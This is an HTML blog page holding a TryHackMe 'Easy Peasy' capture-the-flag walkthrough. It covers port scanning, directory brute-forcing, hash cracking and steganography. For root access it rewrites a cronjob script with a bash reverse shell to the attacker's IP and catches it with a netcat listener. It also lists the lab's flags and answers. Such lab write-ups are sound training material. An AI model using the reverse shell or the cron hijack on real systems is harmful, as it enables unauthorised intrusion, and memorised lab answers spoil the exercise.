@@ -1,0 +1,1156 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="This is my personal website. The purpose of the Website is to assist and monitor my own development.">
+<meta name="google-site-verification" content="NeMnHGyDeeJqt9s_pg03TI1foYUOvLwrHreqLj_mgRE">
+<meta name="language" content="en">
+
+<!-- Twitter And Open Graph Meta -->
+<!-- Open Graph Meta Tags -->
+<meta property="og:title" content="TryHackMe - Easy Peasy">
+<meta property="og:description" content="&lt;p&gt;Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.&lt;/p&gt;
+">
+<meta property="og:type" content="website">
+<meta property="og:url" content="http://localhost:4000/tryhackme-easy-peasy/">
+<meta property="og:image" content="">
+<meta property="og:image:alt" content="">
+<meta property="og:site_name" content="Mr0Wido's Blog">
+<meta property="og:locale" content="en_US">
+
+<!-- Twitter Meta Tags -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@">
+<meta name="twitter:title" content="TryHackMe - Easy Peasy">
+<meta name="twitter:description" content="&lt;p&gt;Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.&lt;/p&gt;
+">
+<meta name="twitter:image" content="">
+
+
+<!-- css -->
+<link rel="shortcut icon" href="/assets/img/favicon.ico" type="ico">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="canonical" href="http://localhost:4000/tryhackme-easy-peasy/">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+<title>TryHackMe - Easy Peasy - Mr0Wido's Blog</title>
+
+
+
+<!-- Script -->
+<script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+<script src="https://kit.fontawesome.com/d54796acd1.js" crossorigin="anonymous"></script>
+
+
+
+
+
+    <title>TryHackMe - Easy Peasy - Mr0Wido's Blog</title>
+    <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
+  </head>
+  <body>
+    <header class="site-header">
+  <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
+  <div class="site-title">
+    <a href="http://localhost:4000">Mr0Wido's Blog</a>
+  </div>
+  <nav class="site-nav">
+    <ul class="site-nav__list">
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/">Home</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/whoami/">Whoami</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/posts/">Posts</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/projects/">Projects</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/cv/">CV</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/categories/">Categories</a>
+      </li>
+      <li class="site-nav__item">
+        <div class="search">
+          <input type="text" id="search-input" placeholder="Search...">
+          <i class="fas fa-search"></i>
+          <ul id="results-container"></ul>
+        </div>
+      </li>
+    </ul>
+  </nav>
+</header>
+
+
+<!-- 360 to 980 -->
+<header class="header-mobile">
+  <div class="header-inner clearfix">
+    <div class="nav-btn nav-slider">
+      <i class="fa-solid fa-bars"></i>
+    </div>
+    <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
+    <div class="site-title">
+      <a href="http://localhost:4000">Mr0Wido's Blog</a>
+    </div>
+  </div>
+</header>
+<nav class="sidebar">
+  <div class="nav-header">
+    <div class="nav-search">
+      <div class="search">
+        <i class="fas fa-search"></i>
+        <input type="search" name="search" id="search-input" placeholder="Search...">
+        <ul id="results-container"></ul>
+      </div>
+    </div>
+  </div>
+  <ul class="nav-categories ul-base">
+    <li><a class="site-nav__link " href="/">Home</a></li>
+    <li><a class="site-nav__link " href="/whoami/">Whoami</a></li>
+    <li><a class="site-nav__link " href="/posts/">Posts</a></li>
+    <li><a class="site-nav__link " href="/projects/">Projects</a></li>
+    <li><a class="site-nav__link " href="/cv/">CV</a></li>
+    <li><a class="site-nav__link " href="/categories/">Categories</a></li>
+  </ul>
+  <ul class="social ul-base">
+    <li><a href="https://twitter.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i></a></li>
+    <li><a href="https://instagram.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i></a></li>
+    <li><a href="https://www.linkedin.com/in/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a></li>
+    <li><a href="https://github.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i></a></li>
+  </ul>
+  <div class="copyright">
+    <span> © Copyright 2023 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a></span>
+  </div>
+</nav>
+<div class="overlay"></div>
+    
+    <div class="container-default">
+      <div class="content-container">
+        <main class="default">
+          <div class="post">
+  <h1 class="post__title">TryHackMe - Easy Peasy</h1>
+  <div class="post__content">
+    <p>Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.</p>
+
+<p>Let’s start.</p>
+
+<p><br></p>
+
+<h2 id="1-enumeration-through-nmap">1. Enumeration through Nmap</h2>
+
+<p>Deploy the machine attached to this task and use nmap to enumerate it.</p>
+
+<p><br></p>
+
+<h3 id="11-how-many-ports-are-open">1.1 How many ports are open?</h3>
+
+<p>Let’s do a nmap scan first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.46.132 -p-
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/nmap.png" alt="nmap"></p>
+
+<p>Three ports are open. These are <strong><code class="language-plaintext highlighter-rouge">80/tcp HTTP, 6498/tcp SSH, and 65524/tcp HTTP</code></strong>.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: 3</code></strong></p>
+
+<p><br></p>
+<h3 id="12-what-is-the-version-of-nginx">1.2 What is the version of nginx?</h3>
+
+<p>Look carefully at port 80.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/nginx.png" alt="nginx"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: 1.16.1</code></strong></p>
+
+<p><br></p>
+
+<h3 id="13-what-is-running-on-the-highest-port">1.3 What is running on the highest port?</h3>
+
+<p>The highest port is 65524.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/apache.png" alt="apache"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: apache</code></strong></p>
+
+<p><br></p>
+
+<hr>
+
+<p><br></p>
+
+<h3 id="2-compromising-the-machine">2 Compromising the machine</h3>
+
+<p>Now you’ve enumerated the machine, answer questions and compromise it!</p>
+
+<p><br></p>
+
+<h3 id="21-using-gobuster-find-flag-1">2.1 Using GoBuster, find flag 1.</h3>
+
+<p>I’m visiting the site running on port 80 and I see such a page.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/first-home.png" alt="first-home"></p>
+
+<p>I checked the source page but couldn’t find anything remarkable.</p>
+
+<p>Let’s do a gobuster scan and see if we can find anything.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$  gobuster dir -u http://10.10.46.132/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/gobuster-one.png" alt="gobuster-one"></p>
+
+<p>We found /hidden the directory. I’ve been looking through the page but couldn’t find any flags. I’m scanning this directory with gobuster.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.46.132/hidden/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/whatever.png" alt="whatever"></p>
+
+<p>Nothing appears on the page. Let’s look at the source page.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/decode.png" alt="decode"></p>
+
+<p>I see an encrypted text. It looks like base64 code. Let’s crack it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "ZmxhZZ3tmMXJzN19mbDRnfQ==" | base64 -d
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/encode.png" alt="encode"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{f1rs7_fl4g}</code></strong></p>
+
+<p><br></p>
+
+<h3 id="22-further-enumerate-the-machine-what-is-flag-2">2.2 Further enumerate the machine, what is flag 2?</h3>
+
+<p>For the second flag, we’ll jump to the other web service running on port 65524/tcp. There is a robots.txt file that discloses a hash.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/robots.png" alt="robots"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">a18672860d0510e5ab6699730763b250</code></strong></p>
+
+<p>Let’s look at the type of hash with hash-identifer.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/id-robots.png" alt="id-robots"></p>
+
+<p>We found the type MD5. Let’s crack it.</p>
+
+<p>I found a site that can crack it online. <a href="https://md5hashing.net/hash" rel="external nofollow noopener" target="_blank">Here</a></p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/cracking-robots.png" alt="cracking-robots"></p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-robots.png" alt="crack-robots"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{1m_s3c0nd_fl4g}</code></strong></p>
+
+<p><br></p>
+
+<h3 id="23-crack-the-hash-with-easypeasytxt-what-is-the-flag-3">2.3 Crack the hash with easypeasy.txt, What is the flag 3?</h3>
+
+<p>When we take a look at Apache, something remarkable emerges.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/flag3.png" alt="flag3"></p>
+
+<p>let’s crack it :9fdafbd64c47471a8f54cd3fc64cd312</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-flag3.png" alt="crack-flag3"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{9fdafbd64c47471a8f54cd3fc64cd312}</code></strong></p>
+
+<p><br></p>
+
+<h3 id="24-what-is-the-hidden-directory">2.4 What is the hidden directory?</h3>
+
+<p>When we go to the source page of the Apache page, we see something like this.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/apache-source.png" alt="apache-source"></p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;p hidden&gt;its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu&lt;/p&gt;</code></p>
+
+<p>Encrypted using bas62. Let’s decrypt using <a href="https://gchq.github.io/CyberChef/" rel="external nofollow noopener" target="_blank">Cyber Chef</a>.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-one.png" alt="crack-one"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: /n0th1ng3ls3m4tt3r</code></strong></p>
+
+<p><br></p>
+
+<h3 id="25-using-the-wordlist-that-provided-to-you-in-this-task-crack-the-hash">2.5 Using the wordlist that provided to you in this task crack the hash</h3>
+<p>what is the password?</p>
+
+<p><em>Hint: GOST Hash john –wordlist=easypeasy.txt –format=gost hash (optional* Delete duplicated lines,Compare easypeasy.txt to rockyou.txt and delete same words)</em></p>
+
+<p>Let’s go to <a href="http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/" rel="external nofollow noopener" target="_blank">http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/</a> . Here is the page that comes up.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/find-dict.png" alt="find-dict"></p>
+
+<p>Let’s check the source of the page.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source.png" alt="dict-source"></p>
+
+<p>We found this hash.. <code class="language-plaintext highlighter-rouge">940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</code></p>
+
+<p>First I look at the type with hash-identifier.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source-id.png" alt="dict-source-id"></p>
+
+<p>It looks like it was encrypted with Sha-256 but when I tried to crack it it didn’t. Let’s crack it starting from the clue.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=easypeasy.txt --format=gost hash.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source-crack.png" alt="dict-source-crack"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: mypasswordforthatjob</code></strong></p>
+
+<p><br></p>
+
+<h3 id="26-what-is-the-password-to-login-to-the-machine-via-ssh">2.6 What is the password to login to the machine via SSH?</h3>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source.png" alt="dict-source"></p>
+
+<p>Let’s download the picture on the page and see. <strong><code class="language-plaintext highlighter-rouge">binarycodepixabay.jpg</code></strong></p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/pixabay.png" alt="pixabay"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+$ steghide extract -sf binarycodepixabay.jpg
+$ cat secrettext.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/secrettext.png" alt="secrettext"></p>
+
+<p>We found the username and password.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Username: boring</code></strong></p>
+
+<p>Let’s crack the encrypted password first.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-pixabay.png" alt="crack-pixabay"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: iconvertedmypasswordtobinary</code></strong></p>
+
+<p><br></p>
+
+<h3 id="27-what-is-the-user-flag">2.7 What is the user flag?</h3>
+
+<p>Let’s do ssh login. Remember ssh is running on port 6498.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i boring@10.10.120.186 -p- 6498
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/sshin.png" alt="sshin"></p>
+
+<p>And we are inside. Let’s get the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/user-flag.png" alt="user-flag"></p>
+
+<p>We found this <strong><code class="language-plaintext highlighter-rouge">synt{a0jvgf33zfa0ez4y}</code></strong>. Let’s crack it.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/rot.png" alt="rot"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{n0wits33msn0rm4l}</code></strong></p>
+
+<p><br></p>
+
+<h3 id="28-what-is-the-root-flag">2.8 What is the root flag?</h3>
+
+<p>We need root privilege . I try <code class="language-plaintext highlighter-rouge">sudo l</code> first but it doesn’t work. Then I check the cron job.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/cron.png" alt="cron"></p>
+
+<p>We found something useful here. Let’s go to the file and do a reverse-shell.</p>
+
+<p>First, let’s set up a netcat listener on our own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
+</code></pre></div></div>
+
+<p>Let’s change the file on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nano /var/www/.mysecretcronjob.sh
+#!/bin/bash
+# i will run as root
+bash -i &gt;&amp; /dev/tcp/10.8.86.168/4444 0&gt;&amp;1
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/secretjob.png" alt="secretjob"></p>
+
+<p>After waiting for a while, we get root privileges.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/root-in.png" alt="root-in"></p>
+
+<p>Yes, we have root privileges. Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/root-flag.png" alt="root-flag"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{63a9f0ea7bb98050796b649e85481845}</code></strong></p>
+
+<p><br></p>
+
+<hr>
+
+<p><br></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br></p>
+
+  </div>
+  <div class="post__footer">
+    <p class="post__date">
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 24, 2023</p>
+    <div class="post__categories">
+      
+      
+      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
+            
+    </div>      
+    
+    <div class="post__tags">
+      <p class="post__tags-title">
+        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
+        <span class="post__tags-container">
+          
+          <span class="post__tags-item">nmap,</span>
+          
+          <span class="post__tags-item">gobuster,</span>
+          
+          <span class="post__tags-item">cronjob</span>
+          
+        </span>
+      </p>
+    </div>
+    
+  </div>
+</div>
+<br>
+
+
+<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    this.page.url = 'http://localhost:4000/tryhackme-easy-peasy/';
+    this.page.identifier = '/tryhackme-easy-peasy';
+    
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
+</noscript>
+
+
+
+        </main>
+      </div>
+      <div class="author-container">
+        
+
+
+<div itemscope itemtype="https://schema.org/Person" class="author-card">
+
+  
+    <div class="author__avatar">
+        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
+    </div>
+  
+  <div class="author__content-head">
+    <div class="author__content">
+      <h3 class="author__name p-name" itemprop="name">
+        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
+      </h3>
+      
+        <div class="author__bio p-note" itemprop="description">
+          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>
+
+        </div>
+      
+    </div>
+  
+    <div class="author__urls-wrapper">
+      <ul class="author__urls social-icons">
+        
+          
+            
+              <li><a href="http://localhost:4000/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+            
+          
+            
+              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+            
+          
+            
+              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+            
+          
+            
+              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+            
+          
+            
+              <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+            
+          
+        
+  
+        
+  
+        
+          <li>
+            <a href="mailto:furkn.dniz@gmail.com" rel="me" class="u-email">
+              <meta itemprop="email" content="furkn.dniz@gmail.com">
+              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+            </a>
+          </li>
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+      </ul>
+    </div>
+  </div>
+  <div class="author__content-head-medium">
+    <div class="author__content">
+      <h3 class="author__name p-name" itemprop="name">
+        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
+      </h3>
+      
+        <div class="author__bio p-note" itemprop="description">
+          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>
+
+        </div>
+      
+      <div class="author__urls-wrapper">
+        <ul class="author__urls social-icons">
+          
+            
+              
+                <li><a href="http://localhost:4000/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+              
+            
+              
+                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+              
+            
+              
+                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+              
+            
+              
+                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+              
+            
+              
+                <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+              
+            
+          
+    
+          
+    
+          
+            <li>
+              <a href="mailto:furkn.dniz@gmail.com" rel="me" class="u-email">
+                <meta itemprop="email" content="furkn.dniz@gmail.com">
+                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+              </a>
+            </li>
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+        </ul>
+      </div>
+    </div>
+  
+
+  </div>
+</div>
+
+      </div>
+    </div>
+
+    <div class="container-medium">
+      <div class="author-container">
+        
+
+
+<div itemscope itemtype="https://schema.org/Person" class="author-card">
+
+  
+    <div class="author__avatar">
+        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
+    </div>
+  
+  <div class="author__content-head">
+    <div class="author__content">
+      <h3 class="author__name p-name" itemprop="name">
+        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
+      </h3>
+      
+        <div class="author__bio p-note" itemprop="description">
+          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>
+
+        </div>
+      
+    </div>
+  
+    <div class="author__urls-wrapper">
+      <ul class="author__urls social-icons">
+        
+          
+            
+              <li><a href="http://localhost:4000/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+            
+          
+            
+              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+            
+          
+            
+              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+            
+          
+            
+              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+            
+          
+            
+              <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+            
+          
+        
+  
+        
+  
+        
+          <li>
+            <a href="mailto:furkn.dniz@gmail.com" rel="me" class="u-email">
+              <meta itemprop="email" content="furkn.dniz@gmail.com">
+              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+            </a>
+          </li>
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+      </ul>
+    </div>
+  </div>
+  <div class="author__content-head-medium">
+    <div class="author__content">
+      <h3 class="author__name p-name" itemprop="name">
+        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
+      </h3>
+      
+        <div class="author__bio p-note" itemprop="description">
+          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>
+
+        </div>
+      
+      <div class="author__urls-wrapper">
+        <ul class="author__urls social-icons">
+          
+            
+              
+                <li><a href="http://localhost:4000/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+              
+            
+              
+                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+              
+            
+              
+                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+              
+            
+              
+                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+              
+            
+              
+                <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+              
+            
+          
+    
+          
+    
+          
+            <li>
+              <a href="mailto:furkn.dniz@gmail.com" rel="me" class="u-email">
+                <meta itemprop="email" content="furkn.dniz@gmail.com">
+                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+              </a>
+            </li>
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+        </ul>
+      </div>
+    </div>
+  
+
+  </div>
+</div>
+
+      </div>
+      <div class="content-container">
+        <main class="default">
+          <div class="post">
+  <h1 class="post__title">TryHackMe - Easy Peasy</h1>
+  <div class="post__content">
+    <p>Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.</p>
+
+<p>Let’s start.</p>
+
+<p><br></p>
+
+<h2 id="1-enumeration-through-nmap">1. Enumeration through Nmap</h2>
+
+<p>Deploy the machine attached to this task and use nmap to enumerate it.</p>
+
+<p><br></p>
+
+<h3 id="11-how-many-ports-are-open">1.1 How many ports are open?</h3>
+
+<p>Let’s do a nmap scan first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.46.132 -p-
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/nmap.png" alt="nmap"></p>
+
+<p>Three ports are open. These are <strong><code class="language-plaintext highlighter-rouge">80/tcp HTTP, 6498/tcp SSH, and 65524/tcp HTTP</code></strong>.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: 3</code></strong></p>
+
+<p><br></p>
+<h3 id="12-what-is-the-version-of-nginx">1.2 What is the version of nginx?</h3>
+
+<p>Look carefully at port 80.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/nginx.png" alt="nginx"></p>
+
